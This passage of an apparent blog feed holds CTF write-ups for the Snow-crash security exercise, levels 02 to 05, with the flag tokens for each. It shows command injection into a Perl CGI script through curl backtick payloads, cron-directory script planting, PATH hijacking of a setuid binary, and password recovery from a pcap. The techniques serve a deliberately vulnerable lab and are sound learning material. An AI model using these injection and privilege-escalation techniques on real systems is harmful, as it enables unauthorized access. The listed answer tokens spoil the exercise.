 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level04</title><link href="http://localhost:4000/ecole42/Level04/" rel="alternate" type="text/html" title="Snow-crash Level04" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level04</id><content type="html" xml:base="http://localhost:4000/ecole42/Level04/"><![CDATA[<h4 id="1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of <code class="language-plaintext highlighter-rouge">level04</code> is the token that got from <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
-</code></pre></div></div>
-<h4 id="2-so-try-login-to-level04-with-the-password-we-got-from-level03-and-try-to-put-the-command-ls--la-we-can-see-the-file-level04">2. So, try login to <code class="language-plaintext highlighter-rouge">level04</code> with the password we got from <code class="language-plaintext highlighter-rouge">level03</code> and try to put the command ‘ls -la’. We can see the file ‘level04’.</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>su level04
-Password: qi0maab88jeaj46qoumi7maus
-level04@SnowCrash:~<span class="err">$</span>
-</code></pre></div></div>
-<h4 id="3-lets-go-inside-in-level04">3. Let’s go inside in level04.</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 16
-dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span>  1 level04 level04  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span>  1 level04 level04 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span>  1 level04 level04  675 Apr  3  2012 .profile
-<span class="nt">-rwsr-sr-x</span>  1 flag04  level04  152 Mar  5  2016 level04.pl
-level04@SnowCrash:~<span class="nv">$ </span>./level04.pl
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-	LANGUAGE <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
-	LC_ALL <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
-	LC_TERMINAL_VERSION <span class="o">=</span> <span class="s2">"3.4.23"</span>,
-	LC_CTYPE <span class="o">=</span> <span class="s2">"UTF-8"</span>,
-	LC_TERMINAL <span class="o">=</span> <span class="s2">"iTerm2"</span>,
-	LANG <span class="o">=</span> <span class="s2">"en_US.UTF-8"</span>
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">"C"</span><span class="o">)</span><span class="nb">.</span>
-Content-type: text/html
-</code></pre></div></div>
-
-<p>We can see A file with <code class="language-plaintext highlighter-rouge">.pl</code> extension.</p>
-
-<p>So, what is a PL file?</p>
-
-<p>A file with .pl extension is a <code class="language-plaintext highlighter-rouge">Perl Script</code> file that is a scripting language.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level04.pl
-<span class="c">#!/usr/bin/perl</span>
-<span class="c"># localhost:4747</span>
-use CGI qw<span class="o">{</span>param<span class="o">}</span><span class="p">;</span>
-print <span class="s2">"Content-type: text/html</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
-sub x <span class="o">{</span>
-  <span class="nv">$y</span> <span class="o">=</span> <span class="nv">$_</span><span class="o">[</span>0]<span class="p">;</span>
-  print <span class="sb">`</span><span class="nb">echo</span> <span class="nv">$y</span> 2&gt;&amp;1<span class="sb">`</span><span class="p">;</span>
-<span class="o">}</span>
-x<span class="o">(</span>param<span class="o">(</span><span class="s2">"x"</span><span class="o">))</span><span class="p">;</span>
-</code></pre></div></div>
-
-<p>This is a simple <code class="language-plaintext highlighter-rouge">CGI(Common Gateway Interface) script</code> that takes a parameter “x” from the query string and prints the result of runnig the command specified by the parameter using the <code class="language-plaintext highlighter-rouge">echo</code> commmand.</p>
-
-<details>
-<summary> Note: What is CGI?  </summary>
-<br />
-What is CGI? : CGI, or Common Gateway Interface, is a standard interface that enables communication between a web server and external programs or scripts. It allows for the creation of dynamic web pages, processing user input, and interaction with databases.
-</details>
-
-<p><br /></p>
-<details>
-<summary> Note: What is query?  </summary>
-<br />
-In the context of the Perl CGI script provided, the "query" refers to the string of parameters and their values that are passed to the script through the URL when it is accessed.
-<br /><br />
-This string typically follows a question mark (?) in the URL and consists of key-value pairs separated by ampersands (&amp;).
-<br /><br />
-For example, if you access the script via a URL like this:
-<br /><br />
-
-http://example.com/cgi-bin/script.cgi?x=ls%20-l
-
-<br /><br />
-In this URL, the query string is x=ls%20-l. Here, x is the parameter name, and ls%20-l is its value. The %20 is a URL-encoded representation of a space character.
-<br /><br />
-So, in this example, the query is x=ls%20-l, where the parameter x is assigned the value ls -l. When the Perl CGI script is executed with this query, it retrieves the value of the x parameter (ls -l in this case) and executes it as a command.
-</details>
-
-<p><br /></p>
-<details>
-<summary> Details for the perl script </summary>
-<br />
-
-1. `#!/usr/bin/perl`: This is a hashebang line specifying the path to the Perl interpreter to be used to execute this script.
-<br /><br />
-
-2. `use CGI qw{param};`: This line imports the param function from the CGI module. The param function is used to retrieve the values of parameters from the query string.
-<br /><br />
-
-3. `print "Content-type: text/html\n\n";`: This line sends an HTTP header indicating that the content is of type "text/html". The double newline (\n\n) separates the header from the body.
-<br /><br />
-
-4. `sub x { ... }`: This defines a subroutine (function) named "x". It takes one parameter and assigns its value to the variable $y.
-<br /><br />
-
-5. `$y = $_[0];`: This line assigns the value of the first (in this case, only) argument passed to the subroutine to the variable $y.
-<br /><br />
-
-6. `print echo $y 2&gt;&1;`: This line prints the result of the command specified in $y. Backticks (``) are used to execute the command, and `2&gt;&amp;1` redirects both standard output and standard error to the output. This is a common technique to capture both normal output and error messages.
-<br /><br />
-
-7. `x(param("x"));`: This line calls the subroutine "x" using the value of the "x" parameter from the query string.
-<br /><br />
-
-In summary, the script takes a parameter named "x" from the query string, uses it as a command, executes the command, and prints the result.
-<br />
-</details>
-<p><br /></p>
-
-<p>We can see another interesting thing in that perl script.
-The script indicates that</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># localhost:4747</span>
-</code></pre></div></div>
-
-<p>Maybe, there is something on the port 4747.</p>
-
-<h4 id="4-lets-check-on-the-port-4747">4. Let’s check on the port 4747.</h4>
-
-<p><code class="language-plaintext highlighter-rouge">nc -zv</code> allows to check connection to 4747 without sending any data and verbose mode.</p>
-
-<details>
-<summary> What is 'nc' command in Linux </summary>
-<br />
-1. nc : This is the command itself, which is short for "netcat." Netcat is a versatile networking utility for reading from and writing to network connections using TCP or UDP protocols.
-<br />
-2.  -z: This option tells nc to scan for open ports rather than initiating a data transfer. When used with the -v option, it prints verbose output, indicating whether the connection was successful or not.
-<br />
-3.  -v: This option stands for "verbose" and instructs nc to provide more detailed output, including the status of each connection attempt.
-<br />
-So, when you run nc -zv, you are instructing Netcat to attempt to connect to a specified host and port without sending any data (-z), while also providing verbose output (-v) to show the result of each connection attempt. This is commonly used for port scanning to check if a port on a remote system is open or closed.
-<br />
-</details>
-<p><br /></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>nc <span class="nt">-zv</span> localhost 4747
-Connection to localhost 4747 port <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
-</code></pre></div></div>
-
-<h4 id="5-now-combine-numbers-3-and-4-and--lets-send-data-using-the-x-parameter-and-port-4747-with-curl-command">5. Now, combine numbers 3 and 4 and  let’s send data using the <code class="language-plaintext highlighter-rouge">x parameter</code> and <code class="language-plaintext highlighter-rouge">port 4747</code> with <code class="language-plaintext highlighter-rouge">curl</code> command.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`whoami`'</span>
-flag04
-</code></pre></div></div>
-
-<p>We got the <code class="language-plaintext highlighter-rouge">Flag04</code> with the whoami parameter.</p>
-
-<p>Maybe we can try again with x parameter with getflag. And here we go, we got the flag :)</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`getflag`'</span>
-Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
-</code></pre></div></div>
-
-<h4 id="6-we-got-a-token-for-next-level05">6. We got a token for next level05</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level05</title><link href="http://localhost:4000/ecole42/Level05/" rel="alternate" type="text/html" title="Snow-crash Level05" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level05</id><content type="html" xml:base="http://localhost:4000/ecole42/Level05/"><![CDATA[<h4 id="1-the-password-of-level05-is-the-token-that-got-from-level04">1. The password of <code class="language-plaintext highlighter-rouge">Level05</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level04</code>.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
-
-</code></pre></div></div>
-<h4 id="2-so-try-login-to-level05-with-the-password-we-got-from-level04-and-try-to-put-the-command-ls--la-lets-see-inside-in-level05">2. So, try login to <code class="language-plaintext highlighter-rouge">Level05</code> with the password we got from <code class="language-plaintext highlighter-rouge">Level04</code> and try to put the command ‘ls -la’. Let’s see inside in level05.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@localhost's password: ne2searoevaevoem4ov4ar8ap
-You have new mail.
-level05@SnowCrash:~$
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-level05@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 12
-dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span>  1 level05 level05  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span>  1 level05 level05 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span>  1 level05 level05  675 Apr  3  2012 .profile
-</code></pre></div></div>
-
-<p>It says that there is a new mail.</p>
-
-<h4 id="4-so-i-found-the-small-hint-from-varmaillevel05">4. So, I found the small hint from /var/mail/level05</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:~<span class="nv">$ </span><span class="nb">cd</span> /var/mail
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 4
-drwxrwsr-x  1 root mail  60 Mar  5  2016 <span class="nb">.</span>
-drwxr-xr-x  1 root root 160 Mar 12  2016 ..
-<span class="nt">-rw-r--r--</span>+ 1 root mail  58 Feb 13 16:49 level05
-</code></pre></div></div>
-
-<p>there is a file <code class="language-plaintext highlighter-rouge">level05</code>.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat </span>level05
-<span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> su <span class="nt">-c</span> <span class="s2">"sh /usr/sbin/openarenaserver"</span> - flag05
-</code></pre></div></div>
-<p>So, I was looking for /usr/sbin/openarenaserver and we found a script as below. Let’s take a look inside one by one.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /usr/sbin/openarenaserver
-<span class="c">#!/bin/sh</span>
-
-<span class="k">for </span>i <span class="k">in</span> /opt/openarenaserver/<span class="k">*</span> <span class="p">;</span> <span class="k">do</span> 
-
-	<span class="o">(</span><span class="nb">ulimit</span> <span class="nt">-t</span> 5<span class="p">;</span> bash <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="o">)</span>
-	<span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span>
-<span class="k">done</span>
-</code></pre></div></div>
-<p>That means that the script goes through each file in the specified directory, sets a CPU time limit of 5 seconds for its execution, executes the script with debugging output, and then removes the script file.</p>
-
-<p>We can’t and should not put anything inside <code class="language-plaintext highlighter-rouge">/opt/openarenaserver</code> because this directory will be deleted in every 2 minutes, so we should put our file safely in <code class="language-plaintext highlighter-rouge">/tmp</code> file.</p>
-
-<p>We therefore, need to create a bash script in that directory,to get the file and to make sure that the optut is redirected to a file in <code class="language-plaintext highlighter-rouge">/tmp</code>. So, the overall effect of this command is to create a file named <code class="language-plaintext highlighter-rouge">getflag05</code> in the <code class="language-plaintext highlighter-rouge">/opt/openarenaserver/</code> directory.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span>
-getflag <span class="o">&gt;</span> /tmp/flag05
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'getflag &gt; /tmp/flag05'</span> <span class="o">&gt;</span> /opt/openarenaserver/getflag05
-level05@SnowCrash:/usr/sbin<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
-Check flag.Here is your token : viuaaale9huek52boumoomioc
-
-level05@SnowCrash:/var/mail<span class="nv">$ </span><span class="nb">cat</span> /tmp/flag05
-Check flag.Here is your token : viuaaale9huek52boumoomioc
-</code></pre></div></div>
-
-<h4 id="5--we-got-a-token-for-next-level06">5.  We got a token for next <code class="language-plaintext highlighter-rouge">level06</code></h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level03</title><link href="http://localhost:4000/ecole42/Level03/" rel="alternate" type="text/html" title="Snow-crash Level03" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level03</id><content type="html" xml:base="http://localhost:4000/ecole42/Level03/"><![CDATA[<h4 id="1-the-password-of-level03-is-the-token-that-got-from-level02">1. The password of <code class="language-plaintext highlighter-rouge">level03</code> is the token that got from <code class="language-plaintext highlighter-rouge">level02</code>.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
-</code></pre></div></div>
-<h4 id="2-so-try-login-to-level03-with-the-password-we-got-from-level02-and-try-to-put-the-command-ls-we-can-see-the-file-level03">2. So, try login to level03 with the password we got from level02 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">level03</code>.</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@SnowCrash:~<span class="nv">$ </span>su level03
-Password: kooda2puivaav1idi4f57q8iq
-level03@SnowCrash:~<span class="nv">$ </span><span class="nb">ls
-</span>level03
-</code></pre></div></div>
-<h4 id="3-try-to-execute-the-level03-but-it-says-exploit-me">3. Try to execute the <code class="language-plaintext highlighter-rouge">level03</code>. but it says <code class="language-plaintext highlighter-rouge">Exploit me</code>.</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>./level03
-Exploit me
-</code></pre></div></div>
-<h4 id="4-when-we-check-with-cat-command-we-can-see-the-file-type-as-below-so-we-can-assume-that-its-binary-file-a-binary-file-is-a-computer-file-that-is-not-a-text-file">4. When we check with <code class="language-plaintext highlighter-rouge">cat</code> command, we can see the file type as below. so, we can assume that it’s <code class="language-plaintext highlighter-rouge">binary file</code>. (A binary file is a computer file that is not a text file.)</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level03
-ELF44 	<span class="o">(</span><span class="nv">$!</span>444  TTT��<span class="o">(((</span>��hhhDDP�td44Q�tdR�td��/lib/ld-linux.so.2GNUGNUOX�<span class="p">;</span>�Sy8n�n��KT<span class="o">{</span>K �K��3LD<span class="o">=</span> T<span class="o">)</span>__gmon_start__libc.so.
-6_IO_stdin_usedsetresgidsetresuidsystemgeteg��geteuid__libc_start_mainGLIBC_2.0ii
-...
-..
-<span class="nb">.</span>
-</code></pre></div></div>
-<h4 id="5-so-lets-debug-with-ltrace-ltrace-is-a-debugging-utility-on-unix-like-systems-that-can-be-used-to-intercept-and-display-dynamic-library-calls">5. So, let’s debug with <code class="language-plaintext highlighter-rouge">ltrace</code>. <code class="language-plaintext highlighter-rouge">ltrace</code> is a debugging utility on Unix-like systems that can be used to intercept and display dynamic library calls.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>ltrace ./level03
-__libc_start_main<span class="o">(</span>0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 &lt;unfinished ...&gt;
-getegid<span class="o">()</span>                                         <span class="o">=</span> 2003
-geteuid<span class="o">()</span>                                         <span class="o">=</span> 2003
-setresgid<span class="o">(</span>2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
-setresuid<span class="o">(</span>2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
-system<span class="o">(</span><span class="s2">"/usr/bin/env echo Exploit me"</span>Exploit me
- &lt;unfinished ...&gt;
-<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
-&lt;... system resumed&gt; <span class="o">)</span>                            <span class="o">=</span> 0
-+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
-</code></pre></div></div>
-<p>We found the echo of “Exploit me”, the same result when we execute ./level03 at the beginning.</p>
-
-<p><code class="language-plaintext highlighter-rouge">system("/usr/bin/env echo Exploit me"Exploit me</code></p>
-
-<p>It shows that <code class="language-plaintext highlighter-rouge">echo</code> command is executed from the located in <code class="language-plaintext highlighter-rouge">/usr/bin/env</code>.</p>
-
-<p>If so, we can control the execution of the env command by changing the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable.</p>
-
-<h4 id="6-to-execute-the-program-getflag-located-in-bin-as-if-it-were-echo-we-create-a-symbolic-link-named-echo-to-pointing-getflag-in-tmp-directory-by-adding-tmp-to-the-path-we-ensure-that-our-fake-echo-in-tmp-is-executed-when-env-searches-for-the-echo-command">6. To execute the program <code class="language-plaintext highlighter-rouge">getflag</code> located in <code class="language-plaintext highlighter-rouge">/bin</code> as if it were echo, we create a symbolic link named echo to pointing <code class="language-plaintext highlighter-rouge">getflag</code> in <code class="language-plaintext highlighter-rouge">/tmp</code> directory. By adding <code class="language-plaintext highlighter-rouge">/tmp</code> to the PATH, we ensure that our fake echo in <code class="language-plaintext highlighter-rouge">/tmp</code> is executed when <code class="language-plaintext highlighter-rouge">env</code> searches for the <code class="language-plaintext highlighter-rouge">echo</code> command.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /bin/getflag /tmp/echo
-level03@SnowCrash:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"/tmp:</span><span class="nv">$PATH</span><span class="s2">"</span>
-level03@SnowCrash:~<span class="nv">$ </span>./level03
-Check flag.Here is your token :qi0maab88jeaj46qoumi7maus
-</code></pre></div></div>
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">ln</code>: to create the links for the files</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">-s</code>: option to specify that this will be a symbolic link.</p>
-  </li>
-  <li>
-    <p>/bin/getflag : Location that is stored Password</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">export PATH="/tmp:$PATH"</code> : Add the PATH environment variable to pointing /tmp directory.</p>
-  </li>
-</ul>
-
-<h4 id="7--we-got-a-token-for-next-level04">7.  We got a token for next level04</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level02</title><link href="http://localhost:4000/ecole42/Level02/" rel="alternate" type="text/html" title="Snow-crash Level02" /><published>2024-02-12T00:00:00+09:00</published><updated>2024-02-12T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level02</id><content type="html" xml:base="http://localhost:4000/ecole42/Level02/"><![CDATA[<h4 id="1-the-password-of-level02-is-the-token-that-got-from-level01">1. The password of level02 is the token that got from level01.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2av5il02puano7naaf6adaaf
-
-</code></pre></div></div>
-<h4 id="2-so-try-login-to-level02-with-the-password-we-got-from-level01-and-try-to-put-the-command-ls-we-can-see-the-file-level01pcap">2. So, try login to level02 with the password we got from level01 and try to put the command ‘ls’. We can see the file ‘level01.pcap’.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@SnowCrash:~$ su level02
-Password: f2av5il02puano7naaf6adaaf
-level02@SnowCrash:~$ ls
-level02.pcap
-</code></pre></div></div>
-
-<h4 id="3-so-what-is-a-pcap-file-you-can-check-the-detail-answer-the-following-link">3. So, what is a PCAP file? You can check the detail answer the following link.</h4>
-
-<p><a href="https://www.endace.com/learn/what-is-a-pcap-file">What is a PCAP file?</a></p>
-
-<p>pcap (short for Packet Capture) file is a binary file format used to store network packet data captured during network traffic monitoring or analysis. These files can be created by various packet sniffing tools and network monitoring software. The format is widely supported, making it a standard way to store and exchange captured network data.</p>
-
-<h4 id="4-as-explained-in-the-link-for-read-the-pcap-file-we-will-use-the-program-wireshark-to-open-ths-pcap-file-we-will-safely-copy-level02pcap-file-in-another-local-terminal-and-we-will-open-with-a-tool-wireshark">4. As explained in the link, for read the PCAP file, we will use the program Wireshark. To open ths pcap file, we will safely copy level02.pcap file in “another local terminal” and we will open with a tool “WireShark”</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp -P 4242 level02@127.0.0.1:/home/user/level02/level02.pcap /tmp
-</code></pre></div></div>
-
-<h4 id="5-go-look-for-tmp-in-terminal-and-we-successfully-downloaded-the-pcap-file">5. Go look for /tmp in terminal and we successfully downloaded the pcap file.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level02.pcap      100% 8302     8.1KB/s   00:00
-
-</code></pre></div></div>
-<h4 id="6-open-the-pcap-file-with-wireshark-we-found-the-clue-of-the-password-as-you-can-see-the-foloowing-image">6. Open the pcap file with WireShark. We found the clue of the password as you can see the foloowing image.</h4>
-
-<p><img src="/assets/image.png" alt="img" /></p>
-
-<h4 id="7-to-know-more-details-of-tcp-packets-clicked-the-follow-tcp-stream-dialog-box-the-stream-content-is-displayed-in-the-same-sequence-as-it-appeared-on-the-network">7. To know more details of TCP Packets, clicked the “Follow TCP Stream” dialog box. The stream content is displayed in the same sequence as it appeared on the network.</h4>
-
-<p>TCP Streams are “Segmented and Shipped by IP Packets”.</p>
-
-<p>TCP sends its data in little chunks called IP packets (or IP datagrams). In this way, HTTP is the top layer in a “protocol stack” of “HTTP over TCP over IP,”</p>
-
-<p><img src="/assets/image-1.png" alt="img" /></p>
-
-<p>we can see the clue of the password as below. But this is still NOT the correct password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password: ft_wandr...NDRel.L0L
-</code></pre></div></div>
-<p>In this case, let’s change display to “hexdump” And let’s see if they’re correctly corresponded to the HEX number and see if they’re printable.</p>
-
-<p><img src="/assets/image-2.png" alt="img" /></p>
-
-<table>
-  <thead>
-    <tr>
-      <th>HEX</th>
-      <th>66</th>
-      <th>74</th>
-      <th>5f</th>
-      <th>77</th>
-      <th>61</th>
-      <th>6e</th>
-      <th>64</th>
-      <th>72</th>
-      <th>7f</th>
-      <th>7f</th>
-      <th>7f</th>
-      <th>4e</th>
-      <th>44</th>
-      <th>52</th>
-      <th>65</th>
-      <th>6c</th>
-      <th>7f</th>
-      <th>4c</th>
-      <th>30</th>
-      <th>4c</th>
-      <th>0d</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Ascii</td>
-      <td>f</td>
-      <td>t</td>
-      <td>_</td>
-      <td>w</td>
-      <td>a</td>
-      <td>n</td>
-      <td>d</td>
-      <td>r</td>
-      <td>DEL</td>
-      <td>DEL</td>
-      <td>DEL</td>
-      <td>N</td>
-      <td>D</td>
-      <td>R</td>
-      <td>e</td>
-      <td>l</td>
-      <td>DEL</td>
-      <td>L</td>
-      <td>0</td>
-      <td>L</td>
-      <td>RETURN</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>HEX 7f corresponded to DEL : So, n, d, r will be deleted and same for l.
-HEX 0d corresponded to CARRIAGE_RETURN (‘\r’) : so it represent the end of the line.
-So, password should be from ft_wandr…NDRel.L0L to ft_waNDReL0L</p>
-
-<p>So, we found our password! Let’s put our password into flag02</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level02@SnowCrash:~$ su flag02
-Password: 
-Don't forget to launch getflag !
-flag02@SnowCrash:~$ getflag
-Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
-flag02@SnowCrash:~$ ^C
-flag02@SnowCrash:~$ 
-</code></pre></div></div>
-
-<h4 id="8-we-got-a-token-for-next-level03">8. We got a token for next level03</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kooda2puivaav1idi4f57q8iq
 </code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry></feed>
